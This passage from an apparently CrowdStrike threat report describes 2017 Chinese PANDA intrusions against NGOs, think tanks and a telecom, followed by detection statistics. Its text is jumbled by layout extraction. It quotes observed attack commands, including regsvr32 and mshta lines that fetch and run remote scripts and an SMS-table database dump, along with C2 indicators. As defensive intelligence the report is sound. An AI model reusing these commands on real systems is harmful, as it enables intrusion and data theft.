re-compiled open-source SSH tunneler.[9] An\nexample of the command line used to perform\nthe data harvesting is provided here:\n\n\nEOF\n/bin/date +%Y-%m-%d:%H:%M:%S >>/dmpdata/\ntmp/[REDACTED].tbl\n/usr/bin/bzip2 /dmpdata/tmp/[REDACTED].csv\n/usr/bin/touch /dmpdata/tmp/[REDACTED].done\n/bin/rm -f /dmpdata/tmp/[REDACTED].csv\n/bin/date +%Y-%m-%d:%H:%M:%S >>/dmpdata/\ntmp/[REDACTED].tbl\n\nThe breadth of identified malicious behavior\nacross the network demonstrates how deeply\nthis adversary had embedded itself within\nthe victim network, and serves as a warning\nto the telecommunications sector regarding\nChina’s prioritization of targeting their industry,\nparticularly in Southeast Asia.\n\n\n**Figure 10**\nNumber of\nPANDA Intrusions\n\nTargeting\nWestern NGOs in\n\n2017\n\n\n10\n\n9\n\n\n6\n\n5\n\n\n4\n\n3\n\n\n2\n\n\nDemocracy\nPromotion NGO1\n\nDemocracy\nPromotion NGO2\n\nThink Tank 1\n\nThink Tank 2\n\nThink Tank 3\n\nThink Tank 4\n\n\n1\n\n0\n\n\nJAN FEB MAR APR MAY JUN JUL AUG SEP OCT NOV DEC\n\n###### 2017\n\n\nssxx -0 10.x.x.x -l [REDACTED]\n/bin/date +%Y-%m-%d:%H:%M:%S >/dmpdata/\ntmp/[REDACTED].tbl\n/[REDACTED]/lib64/ocs/isql -U[REDACTED]\n-P[REDACTED] -S[REDACTED] <<EOF>>/dmpdata/\ntmp/[REDACTED].tbl\nset temporary option TEMP_EXTRACT_SIZE1 =\n1073741824\nset temporary option TEMP_EXTRACT_NULL_\nAS_EMPTY = 'on'\nset temporary option TEMP_EXTRACT_COLUMN_\nDELIMITER = '|'\nset temporary option TEMP_EXTRACT_QUOTE\n= ''\nset temporary option Temp_Extract_Name1 =\n'/dmpdata/tmp/[REDACTED].csv'\nset temporary option Temp_Extract_Name2\n= ''\nset temporary option Temp_Extract_Binary\n= 'off'\nset temporary option Temp_Extract_Swap =\n'off'\ngo\nSELECT * FROM [REDACTED].UMTS_IU_SMS_\n\n[REDACTED];\nGO\n\n\n###### PANDAs Increase Their Targeting of Western Policy-Focused NGOs\n\nDuring 2016, OverWatch observed BEAR\nadversaries targeting several U.S. think tanks\nand NGOs focusing on public policy. Their\noperational tempo dramatically increased as that\nyear progressed. OverWatch identified at least\ntwelve separate campaigns — from late August\nthrough the end of 2016 — aligning with likely\nRussian government intentions to influence the\nU.S. presidential elections that autumn. Since\nPresident Trump assumed office in early 2017,\nOverWatch has seen a reduction in the rate of\nBEAR targeting against think tanks and policy\norganizations. CrowdStrike assesses that the\ndecrease in activity could be the result of a\nshift in Russian priorities and focus after the\nU.S. presidential election ended. It could also\nrepresent a temporary pause in targeting think\ntanks, in order to reevaluate their influence\nstrategies following the highly public exposure\nof Russian interference in Western elections.\n\n\nBelow, a sample of these cases are\ndescribed in greater detail.\n\n###### PANDA Actors Repeatedly\n Spear-Phish Mongolia-Based Democracy Activists\n\n\nTechniques Observed\n\n- Persistence: Hidden Files and Directories,\n\nScheduled Task\n\n- Defense Evasion: DLL Side-Loading, Process\n\n\nSource:\nCrowdStrike Falcon OverWatch\n\nlaptop. The first message included a malicious\nattachment titled CV.doc. When opened, the\nfile exploited a known application whitelisting\nbypass technique that uses the regsvr32 utility\nto request and execute a script from a remote\nserver. In this case, it did so using the following\ncommand:\n\n\n7 http://sectools.org/\n\ntool/hydra/\n\n\nHollowing\n\n- Discovery: Account Discovery, System\n\nInformation Discovery, System Network\nConfiguration Discovery, System Network\nConnections Discovery\n\n- Execution: Regsvr32, PowerShell\n\n- Command and Control: Remote File Copy,\n\n\nregsvr32.exe /u /s /i:http://www.geocities[.]\njp/bqwfvh9/cv0309.sct scrobj.dll\n\nThe customer chose not to take immediate\ncontainment actions and over the next half\nhour, OverWatch observed execution of the\nPowerShell Empire post-exploitation agent as\nwell as Poison Ivy, which was side-loaded via a\nlegitimate Symantec binary:\n\n\nWhile BEAR activity against U.S. think tanks\ndeclined in 2017, OverWatch observed an\nincrease in the rate of PANDAs targeting\nWestern think tanks and other policy-oriented\nNGOs in comparison to the previous year. A\nsummary of these PANDA intrusions in 2017 is\nprovided in the following chart.\n\n\n8 https://github.\n\ncom/5loyd/xsocks\n\n\n9 https://github.com/\n\nmetacloud/openssh/\n\nblob/master/openbsd\n\nUncommonly Used Port\n\nIn the spring of 2017, PANDA actors sent\ntwo separate spear-phishing messages to\na Mongolia-based activist working for an\nNGO that promotes global democracy. The\nphishes were sent to the victim’s personal\nemail account, but were opened on his work\n\n\nFile: C:\\Program Files (x86)\\Common Files\\\nSymantecProtect\\ldvpreg.exe\nHash: 61d1943f0b702f4c16bb37228ade1d­\n8f0ef4675b480921950d026c82e4a65fde\n\n\ncompat/port-tun.c\n\n\n-----\n\n###### 68 69\n\n\nActions on objectives prior to initiation of\nremediation were limited, consisting primarily\nof using the legitimate attrib.exe[10] tool to hide\nevidence of malicious files. Also notable in\nthe attack was the use of C2 infrastructure\nattempting to replicate legitimate domains,\nincluding microsoftwinword[.]com and www.\napplenetsuppprt[.]com .\n\nThe second spear-phishing message, opened\ntwo days later, used a lure of Interview_\noutline.zip. When unzipped, a LNK file was\nwritten. The user clicked the LNK file, which\nwas set to launch mshta.exe using an unusual\ntechnique that runs a VBScript command\ndirectly from the mshta command line:\n\n\"C:\\Windows\\System32\\mshta.exe\" vb­\nscript:Execute(\"dim result:result=GetObject\n(\"\"script:http://www.geocities[.]jp/bqwfvh9/\n\n[REDACTED].wsc\"\")(window.close)\")\n\nThe same geocities[.]jp URL was used in the\nfirst phishing attack, but in this case, the called\nscript was named after the victimized user,\nindicating that the adversary knew precisely\nwho they were targeting. Subsequent activity\non the host during the next 10 minutes involved\nPowerShell Empire commands and hiding files\nas before, but interactive commands were more\nextensive. The actor conducted reconnaissance\nusing netstat, net user, net view and ipconfig\ncommands. Additional tools were staged in the\nfollowing paths:\n\nC:\\ProgramData\\\nC:\\ProgramData\\Adobe\\\nC:\\Intel\\Logs\\\n\nThese tools included signed, legitimate\nSymantec binaries for PlugX side-loading, and\na tool used to establish and update persistence\nscripts, as well as at least five PowerShell and\nVisual Basic scripts. These scripts collected the\n\n\noperating system version, computer name and\nusername, and set up periodic beaconing of this\ninformation to three hardcoded C2 channels:\n\n104.203.108.94\nservice[.]microdownloadcenter[.]com\nservice[.]read-books[.]org\n\nThe adversary also established two persistence\nmechanisms. The script ctfmon.vbs was\nwritten and scheduled to run by the created\ntask Security Notify Script, which uses\nPowerShell and svchost.exe to beacon to\nthe Korea-based IP address 27.255.92[.]251.\nAnother script, consvc.vbs, launched the\nsimilarly named executable consvc.exe, which\nestablished network connections to the Chinabased IP address 192.74.252[.]6 over port 4001.\nThe consvc.exe executable had been seen in\na previous intrusion into this NGOs network\nenvironment, indicating this PANDA adversary’s\nlikely long-term and persistent interest in the\nvictim organization.\n\nAlmost two months later, the same PANDA\nadversary conducted another similar spearphishing attack against the victim NGO. In this\ncase, the lure was titled 5_STATEMENT.doc\nand was sent to a different user, who was also\nbased in Mongolia. As before, the message\nwas sent to the victim’s personal email, but\nwas opened on his work laptop. When opened,\nCVE-2017-0199 was leveraged to download\nhttp://61.97.250[.]54/download/7.gif. The\nfile 7.gif was an HTA (HTML Application) for\nWindows that contained an encoded VBScript\n, which in turn executed an obfuscated\nPowerShell script. The malicious PowerShell\nprocess connected to the same geocities[.]jp\ndomain seen previously. The C2 infrastructure\nused in this attack had previously been used\nwith PlugX and Poison Ivy, and potentially\nFlagDownloaderRAT as well, further suggesting\nChinese actor involvement.\n\n\n###### Multiple Western Think Tanks\n and Asian Telecom Provider Targeted Simultaneously\n\nTechniques Observed\n\n- Defense Evasion: DLL Side-Loading\n\n- Command and Control\n\nBeginning early in 2017 and continuing through\nmuch of the year, Falcon OverWatch identified\nrepeated and continued PANDA targeting of\nWestern think tanks. Malicious tools employed\nin the attacks included those commonly used by\nPANDA adversaries: PlugX, Poison Ivy, Trochilus,\nMimikatz, and the Chopper webshell. The PlugX\nactivity involved the use of legitimate binaries to\nmaliciously side-load the PlugX DLL. One such\nlegitimate file used in the attacks was a\nMcAfee binary:\n\nFILE: C:\\\\ProgramData\\SamSungHelp\\\nmcoemcpy.exe\n\nIn late 2017, OverWatch noticed a change in\ntactics when the adversary installed Mangzamel\nmalware on one of the think tank victim’s\nnetworks. One day later, the same behavior\nwas observed at a second such think tank. C2\ninfrastructure used in these attacks included IP\naddress assigned to a hosting provider in Hong\nKong. This IP was used for C2 in the previously\nmentioned PlugX activity as well. Of particular\ninterest was the discovery that this C2 node\nwas used similarly in targeted attacks against a\nsoutheast Asian telecommunications company.\n\n\nThis occurred less than a week after the\nMangzamel implant was installed on the think\ntank networks.\n\nIn the telecom victim’s network, the C2 was used\nfor the Trochilus RAT. As noted, this PANDA actor\nused Trochilus against at least one of their think\ntank targets as well. In each environment, the\nTrochilus RAT leveraged svchost.exe to load a\nunique DLL with various hashes and using the\nfollowing file name:\n\nC:\\ProgramData\\Windows Imaging Devices\nNetwork Sharing Service\\ImagingEngine.dll\n\nBased on common C2 infrastructure and\noverlapping TTPs, Falcon Intelligence has high\nconfidence that the behavior observed at these\nthink tanks are attributable to the same PANDA\nactor. The adversary’s targeting of victims in\nseparate geographic regions and industry\nverticals, as well as their reuse of infrastructure\nand tools, continue to demonstrate China’s\npervasive and brash attempts to use network\nattacks in support of national interests.\n\n\n10 https://technet.\n\nmicrosoft.com/en-us/\n\nlibrary/bb490868.aspx\n\n\n-----\n\n###### 70 71\n\n Findings Part 3\n CROWDSTRIKE\n\n Background\n\n Emphasizing intelligence has been a cornerstone of\n\n##### THREAT CrowdStrike's approach to security since the company's\n\n###### founding.

There are many methods to slow\ndown attackers and make their attempts at\nlateral movement more visible. These include\nlimiting user account permissions, application\nwhitelisting, segregating users and neworks,\nand aggressively applying available patches.\n\n\nThe chart above depicts Falcon telemetry in\nterms of major operating system coverage.\n\nThe importance of collecting this amount of\ntelemetry isn’t simply about amassing the\nsecurity industry’s biggest data store, but\nhow effectively that information is being used.\nFor example, Threat Graph telemetry is used\nby Falcon OverWatch, CrowdStrike’s team of\nproactive threat hunters that uses the data to\nidentify, investigate and advise on threat activity\n\n\nin customers’ environments.\n\nThe graph in Figure 12 is a sample of how Threat\nGraph data is used to generate hunting leads,\nwhich OverWatch analysts sift and review to\ndetermine whether the identified behavior\nis malicious or intrusion-related activity. The\n“needle in a haystack” analogy is an apt one here:\nAdversaries are clever in their use of legitimate\nsystem resources to mask their behavior, so the\nmajority of sifted data tends to be benign.\n\n\n**Figure 11**\nPercentage of\nFalcon Telemetry\nCoverage per Major\nOperating System\n\n**Figure 12**\nNumber of\nMalicious vs.\nBenign Leads\nInvestigated by\nFalcon OverWatch\nOver a 24-Hour\nTime Period That\nResulted in Two\nTargeted Attack\nNotifications\n\n\nAs most security professionals are aware,\ndwell time is the period between when a\nmalicious attack enters your network and when\nit is discovered. The longer the dwell time,\nthe greater the potential for damage. In the\n\"CrowdStrike Cyber Intrusion Services Casebook\n2017,\" the CrowdStrike Services team reported\nthe average attacker dwell time recorded by\nCrowdStrike incident responders during field\ninvestigations conducted in 2017 was 86 days.\n\nA related statistic that CrowdStrike calls\n\"breakout time\" describes lateral movement\nspeed and refers to how quickly after\npenetrating your network the attacker moves\n\n\n###### AVERAGE BREAKOUT TIME OBSERVED IN 2017\n\n Hour Minutes\n 1 +58\n\n\n###### 11,117,018\n\n\n###### Antivirus Effectiveness\n\n\nimplementation.

This is illustrated by another\nThreat Graph statistic, which showed that in the\nmajority of cases recorded in 2017, CrowdStrike\nFalcon’s ML capabilities detected malicious\nsoftware seven days before other traditional AV\nproducts, while offering coverage for 43% more\nmalicious software.\n\n\n###### From ThreatGraph data CrowdStrike observed 39 percent of all detections in 2017 were malicious software that went undetected by traditional antivirus 39[%]\n\n Malware-Free Attacks by Industry\n\n\nthe top of this list, you need to aggressively\nstrengthen your defenses to address these\nsophisticated attacks.\n\n\n**Figure 13**\nPercentage of\nMalware-Based\nvs. Malware-Free\nAttacks\n\n\nThe chart below illustrates the percentage\nof malware versus malware-free attacks by\nindustry.

Today’s defensive methodology\nincludes understanding the behavior of the\nmalware and preventing it from executing\nas quickly as possible. The shift in defense\nstrategy is necessary to address changing\nattacker techniques, such as the pivot toward\nfileless and malware-free attacks. For example,\nthreat actors such as INDRIK SPIDER have\nused the Emotet downloader (developed and\n\n\noperated by MUMMY SPIDER) to distribute the\nDridex malware, such as TrickBot and QakBot.\nCrowdStrike employs a strong combination of\nmachine learning and behavioral indicators of\nattack (IOAs) within the Falcon EPP platform to\ncombat this type of threat.\n\nBlended threats such as Emotet indicate how\nthe line between malware versus malware-free\ntechniques has blurred. While eCrime actors\ncontinue to develop more advanced forms of\nmalware, CrowdStrike assesses that malwarefree attacks will continue to be a dominant\ntechnique in 2018 and beyond.\n\n\n-----\n\n###### 78 79\n\n RECOMMENDATIONS\n\nBased on the findings contained in this report, **3.
